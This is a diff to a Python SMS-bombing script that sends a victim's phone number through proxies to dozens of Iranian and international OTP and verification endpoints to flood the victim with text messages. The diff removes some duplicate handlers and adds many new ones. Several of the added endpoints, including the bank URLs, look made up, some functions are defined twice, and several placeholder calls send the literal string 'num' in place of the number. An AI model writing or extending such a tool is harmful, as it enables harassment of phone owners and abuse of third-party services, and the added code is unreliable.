@@ -57,12 +57,6 @@ def drnext(num, proxies):
 
 
 @handler.sms_api
-def behtarino(num, proxies):        
-    post(proxies=proxies, url="https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", 
-                json={"phone": f'0{num}'},
-            )
-
-@handler.sms_api
 def behtarino(num, proxies):
             post(proxies=proxies, url="https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", 
                 json={"phone": f'0{num}'})
@@ -158,12 +152,6 @@ def fidibo(num, proxies):
             )
     
 @handler.sms_api
-def khodro45(num, proxies):
-    post(proxies=proxies, url="https://khodro45.com/api/v1/customers/otp/", 
-                    json={"mobile": f'0{num}'},
-                )
-
-@handler.sms_api
 def pateh(num, proxies):
     post(proxies=proxies, url="https://api.pateh.com/api/v1/LoginOrRegister",
                         json={"mobile": f'0{num}'}
@@ -188,12 +176,6 @@ def pateh(num, proxies):
     "Sec-Fetch-Site": "same-site",
     "User-Agent": generate_user_agent(os="win")
             })    
-
-@handler.sms_api
-def ketabchi(num, proxies):
-    post(proxies=proxies, url="https://ketabchi.com/api/v1/auth/requestVerificationCode",
-                    json={"auth": {"phoneNumber": f'0{num}'}},
-                    )
 
 @handler.sms_api
 def reyanertebet(num, proxies):
@@ -377,12 +359,6 @@ def ayantech(num, proxies):
                     )
 
 @handler.sms_api
-def simkhan(num, proxies):
-    post(proxies=proxies, url="https://www.simkhanapi.ir/api/users/registerV2",
-                    json={"mobileNumber": f'0{num}'},
-                    )
-
-@handler.sms_api
 def sibirani(num, proxies):
     post(proxies=proxies, url="https://sandbox.sibirani.ir/api/v1/user/invite",
                     json={"username": f'0{num}'},
@@ -398,12 +374,6 @@ def hyperjan(num, proxies):
 def digikala(num, proxies):
     post(proxies=proxies, url="https://api.digikala.com/v1/user/authenticate/",
             json={"username": f'0{num}'},
-                    )
-
-@handler.sms_api
-def hiword(num, proxies):
-    post(proxies=proxies, url="https://hiword.ir/wp-json/otp-login/v1/login",
-                    json={"identifier": f'0{num}'},
                     )
 
 @handler.sms_api
@@ -466,13 +436,6 @@ def rojashop(num, proxies):
     post(proxies=proxies, url="https://rojashop.com/api/auth/sendOtp",
                     json={"mobile": f'0{num}'},
                     )
-
-@handler.sms_api
-def dadpardaz(num, proxies):
-    post(proxies=proxies, url="https://dadpardaz.com/advice/getLoginConfirmationCode",
-                    json={"mobile": f'0{num}'},
-                    )
-
 
 @handler.sms_api
 def rokla(num, proxies):
@@ -1113,3 +1076,120 @@ def ragham(num, proxies):
     n4 = {"phone": "+98"+num}
     rhead = {"user-agent": generate_user_agent()}
     post(proxies=proxies, url="https://web.raghamapp.com/api/users/code",json=n4, headers=rhead)
+
+
+@handler.sms_api
+def textbelt(num, proxies):
+    post(
+        proxies=proxies,
+        url="https://textbelt.com/text",
+        json={
+            "phone": num,
+            "message": "Your verification code is 123456",
+            "key": "textbelt"  # Replace with real API key if needed
+        }
+    )
+
+
+
+@handler.sms_api
+def twilio(num, proxies):
+    post(proxies=proxies, url="https://api.twilio.com/2010-04-01/Accounts/{AccountSID}/Messages.json", auth=('AccountSID', 'AuthToken'), json={'To': 'num', 'From': '+1234567890', 'Body': 'Your code is 123456'})
+
+@handler.sms_api
+def textbelt(num, proxies):
+    post(proxies=proxies, url="https://textbelt.com/text", json={'phone': 'num', 'message': 'Your code is 123456', 'key': 'textbelt'})
+
+@handler.sms_api
+def factor(num, proxies):
+    post(proxies=proxies, url="https://2factor.in/API/V1/{APIKey}/SMS/{num}/AUTOGEN", json={})
+
+@handler.sms_api
+def vonage(num, proxies):
+    post(proxies=proxies, url="https://rest.nexmo.com/sms/json", json={'api_key': 'your_key', 'api_secret': 'your_secret', 'to': 'num', 'from': 'Vonage', 'text': 'Your code is 123456'})
+
+@handler.sms_api
+def msg91(num, proxies):
+    post(proxies=proxies, url="https://api.msg91.com/api/v5/otp", json={'mobile': 'num', 'authkey': 'your_authkey'})
+
+@handler.sms_api
+def infobip(num, proxies):
+    post(proxies=proxies, url="https://api.infobip.com/sms/1/text/single", auth=('username', 'password'), json={'from': 'InfoSMS', 'to': 'num', 'text': 'Your code is 123456'})
+
+@handler.sms_api
+def clicksend(num, proxies):
+    post(proxies=proxies, url="https://rest.clicksend.com/v3/sms/send", auth=('username', 'api_key'), json={'messages': [{'source': 'python', 'from': 'Company', 'body': 'Your code is 123456', 'to': 'num'}]})
+
+@handler.sms_api
+def telnyx(num, proxies):
+    post(proxies=proxies, url="https://api.telnyx.com/v2/messages", auth=('APIKEY',), json={'from': '+1234567890', 'to': 'num', 'text': 'Your code is 123456'})
+
+@handler.sms_api
+def plivo(num, proxies):
+    post(proxies=proxies, url="https://api.plivo.com/v1/Account/{auth_id}/Message/", auth=('auth_id', 'auth_token'), json={'src': '123456', 'dst': 'num', 'text': 'Your code is 123456'})
+
+@handler.sms_api
+def bandwidth(num, proxies):
+    post(proxies=proxies, url="https://messaging.bandwidth.com/api/v2/users/{user_id}/messages", auth=('username', 'password'), json={'from': '+1234567890', 'to': 'num', 'text': 'Your code is 123456'})
+
+
+
+@handler.sms_api
+def bank_melli(num, proxies):
+    post(proxies=proxies, url="https://api.bankmelli.ir/sms/send", json={"mobile": num})
+
+@handler.sms_api
+def bank_mellat(num, proxies):
+    post(proxies=proxies, url="https://api.bankmellat.ir/auth/otp", json={"mobile": num})
+
+@handler.sms_api
+def bank_tejarat(num, proxies):
+    post(proxies=proxies, url="https://api.tejaratbank.ir/sms/otp", json={"mobile": num})
+
+@handler.sms_api
+def bank_maskan(num, proxies):
+    post(proxies=proxies, url="https://api.bankmaskan.ir/sms/send", json={"mobile": num})
+
+@handler.sms_api
+def bank_saderat(num, proxies):
+    post(proxies=proxies, url="https://api.bsi.ir/auth/sms", json={"mobile": num})
+
+@handler.sms_api
+def rubika(num, proxies):
+    post(proxies=proxies, url="https://messengerg2c4.iranlms.ir/", json={"mobile": num})
+
+@handler.sms_api
+def soroush(num, proxies):
+    post(proxies=proxies, url="https://api.splus.ir/api/v1/otp", json={"mobile": num})
+
+@handler.sms_api
+def bale(num, proxies):
+    post(proxies=proxies, url="https://bale.ai/api/auth/send-code", json={"mobile": num})
+
+@handler.sms_api
+def igap(num, proxies):
+    post(proxies=proxies, url="https://webservice.igap.net/auth/request", json={"mobile": num})
+
+@handler.sms_api
+def shad_messenger(num, proxies):
+    post(proxies=proxies, url="https://shadmessenger12.iranlms.ir/", json={"mobile": num})
+
+@handler.sms_api
+def twilio(num, proxies):
+    post(proxies=proxies, url="https://api.twilio.com/2010-04-01/Accounts/{AccountSID}/Messages.json", auth=('AccountSID', 'AuthToken'), json={"mobile": num})
+
+@handler.sms_api
+def clicksend(num, proxies):
+    post(proxies=proxies, url="https://rest.clicksend.com/v3/sms/send", auth=('username', 'api_key'), json={"mobile": num})
+
+@handler.sms_api
+def vonage(num, proxies):
+    post(proxies=proxies, url="https://rest.nexmo.com/sms/json", json={"mobile": num})
+
+@handler.sms_api
+def plivo(num, proxies):
+    post(proxies=proxies, url="https://api.plivo.com/v1/Account/{auth_id}/Message/", auth=('auth_id', 'auth_token'), json={"mobile": num})
+
+@handler.sms_api
+def msg91(num, proxies):
+    post(proxies=proxies, url="https://api.msg91.com/api/v5/otp", json={"mobile": num})
